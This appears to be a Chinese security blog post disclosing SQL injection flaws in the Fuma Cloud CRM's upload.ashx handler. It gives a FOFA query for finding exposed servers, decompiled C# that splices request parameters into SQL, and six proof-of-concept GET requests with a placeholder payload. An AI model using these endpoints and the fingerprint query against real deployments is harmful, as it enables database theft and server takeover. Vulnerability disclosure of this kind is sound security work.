---
title: "孚盟云CRM upload.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-upload-sqli.html
asset_dir: assets/孚盟云crm-upload.ashx-sql注入漏洞
---

# 孚盟云CRM upload.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/28 08:20
- 752浏览
- [0评论](#comment)
- 39分钟阅读

深入探索

SaaS

sql

客户关系管理

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云upload.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

## showImgss

直接看 `/Ajax/upload.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 `Ajax.upload` 下的**showImgss**方法的实现如下

```
public void showImgss(HttpContext context)
{
  DataTable dataSource = new MouldDao().GetDataSource($"select  Pic from bfCustomers where FID='{context.Request.QueryString["FID"]}'");
  byte[] numArray1 = (byte[]) null;
```

未经过滤或参数化绑定的参数 **FID** 被直接拼接进SQL语句中进行执行，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

## **deletefile**

```
if (!string.op_Equality(s, "deletefile"))
          break;
        string str25 = context.Request["name"];
        HttpCookie cookie = context.Request.Cookies[str25];
        FileManager fileManager = new FileManager();
        if (cookie == null)
          break;
        string str26 = cookie.Value;
        if (string.op_Inequality(str26, ""))
        {
          DataTable table = this.dbHelper.Query($"select * from dcFile where FUID='{str26}'").Tables[0];
```

通过**name**参数设置**cookie**的**key**，然后将cookie里对应key的value直接拼接进SQL语句中执行，无任何过滤或者校验，导致[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

## showSmallImg

```
public void ShowSmallImg(HttpContext context)
{
  string str1 = context.Request.QueryString["id"];
  string str2 = context.Request.QueryString["tabname"];
  DataTable dataSource = new MouldDao().GetDataSource($"SELECT {context.Request.QueryString["imgField"]} FROM {str2} WHERE FID={str1}");
```

所有SQL语句组成部分均为直接拼接参数，从而导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

## **image**

```
public void image(HttpContext context)
{
  string str1 = context.Request.QueryString["CardID"];
  string str2 = context.Request.QueryString["FID"];
  string str3 = context.Request.QueryString["ConstactFID"];
  Regex regex = new Regex("^\\d+$");
  string str4 = context.Request.QueryString["imagefb"];
  string sql = "";
  DataTable dataTable = (DataTable) null;
  if (str1 != null)
    sql = $"SELECT {str4} FROM bfCamCardInfo WHERE CardID='{str1}'";
  if (str2 != null)
    sql = $"SELECT {str4} FROM bfCamCardInfo WHERE FID='{str2}'";
  if (str3 != null)
    sql = $"SELECT {str4} FROM bfCamCardInfo WHERE ConstactFID='{str3}'";
  if (string.op_Inequality(sql, ""))
    dataTable = new MouldDao().GetDataSource(sql);
```

同上

## showProdImg

```
public void showProdImg(HttpContext context)
  {
    string str1 = context.Request.QueryString["FID"];
    string str2 = context.Request.QueryString["MainImg"];
    string sql = $"SELECT PicPath  FROM bpProdPicBank WHERE ItemNo IN (SELECT ItemNo  FROM bpProducts WHERE FID='{str1}') AND PicType=0";
    if (string.op_Equality(str2, "0"))
      sql = $"SELECT PicPath  FROM bpProdPicBank WHERE FID='{str1}' ";
    DataTable dataSource = new MouldDao().GetDataSource(sql);
```

参数 **FID** 未经任何校验或过滤被直接拼接进SQL语句中执行，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

## DownLoadFieldAttch

```
public void DownLoadFieldAttch(HttpContext context)
{
  DataTable dataSource = new MouldDao().GetDataSource($"SELECT *  FROM dcFile  WHERE FileSavepoc='{(context.Request["trueFileName"] == null ? "" : context.Request["trueFileName"].ToString())}' ");
  if (dataSource == null)
```

参数 **trueFileName** 未经任何校验或过滤被直接拼接进SQL语句中执行，造成[SQL注入漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

## showImgss

```
GET /Ajax/upload.ashx?action=showImgss&FID=SQLI_POC HTTP/1.1
Host: fumacrm.mrxn.net
```

[![孚盟云CRM upload.ashx SQL注入漏洞](images/img-001-1dffe1d712d1.webp)](https://image.mrxn.net/467be9f5dc824e3b9c79330c5f5ccd7c.webp)

成功延时 4 秒

SQL注入检测工具

## deletefile

```
GET /Ajax/upload.ashx?action=deletefile&name=poc HTTP/1.1
Host: fumacrm.mrxn.net
X-Forwarded-For: 127.0.0.1
Cookie: poc=SQLI_POC
```

[![孚盟云CRM upload.ashx SQL注入漏洞](images/img-002-84381fc11292.webp)](https://image.mrxn.net/30cb4d399d51489aaf7db99780ae8d80.webp)

成功利用报错注入在响应回显数据库版本信息

代码安全审计

## showSmallImg

```
GET /Ajax/upload.ashx?action=showSmallImg&id=SQLI_POC&tabpoc=bfContacts&imgField=FID HTTP/1.1
Host: fumacrm.mrxn.net
```

[![孚盟云CRM upload.ashx SQL注入漏洞](images/img-003-ff30b946904a.webp)](https://image.mrxn.net/3b34146d2dab4bc9a0f9ce659878fcab.webp)

成功利用报错注入在响应回显数据库版本信息

## showProdImg

```
GET /Ajax/upload.ashx?action=showProdImg&FID=SQLI_POC HTTP/1.1
Host: fumacrm.mrxn.net
```

[![孚盟云CRM upload.ashx SQL注入漏洞](images/img-004-637bdd43d41c.webp)](https://image.mrxn.net/6ed2350e66fb41f899ee63f6ccbeb4ae.webp)

成功利用报错注入在响应回显数据库版本信息

漏洞修复方案

## **image**

```
GET /Ajax/upload.ashx?action=image&CardID=SQLI_POC&imagefb=FID HTTP/1.1
Host: fumacrm.mrxn.net
```

[![孚盟云CRM upload.ashx SQL注入漏洞](images/img-005-74822db841d1.webp)](https://image.mrxn.net/6602d296d8964261a6cce939c34dc8ba.webp)

成功利用报错注入在响应回显数据库版本信息

## DownLoadFieldAttch

```
GET /Ajax/upload.ashx?action=DownLoadFieldAttch&trueFileName=SQLI_POC HTTP/1.1
Host: fumacrm.mrxn.net
```

[![孚盟云CRM upload.ashx SQL注入漏洞](images/img-006-d85f21c9a51b.webp)](https://image.mrxn.net/fd8e76126cb44688ac1b652f3d69c150.webp)

成功利用报错注入在响应回显数据库版本信息

物流软件安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.showImgss](#toc-4-1-)
- [4.2.deletefile](#toc-4-2-)
- [4.3.showSmallImg](#toc-4-3-)
- [4.4.image](#toc-4-4-)
- [4.5.showProdImg](#toc-4-5-)
- [4.6.DownLoadFieldAttch](#toc-4-6-)
- [5.漏洞复现](#toc-5-)
- [5.1.showImgss](#toc-5-1-)
- [5.2.deletefile](#toc-5-2-)
- [5.3.showSmallImg](#toc-5-3-)
- [5.4.showProdImg](#toc-5-4-)
- [5.5.image](#toc-5-5-)
- [5.6.DownLoadFieldAttch](#toc-5-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
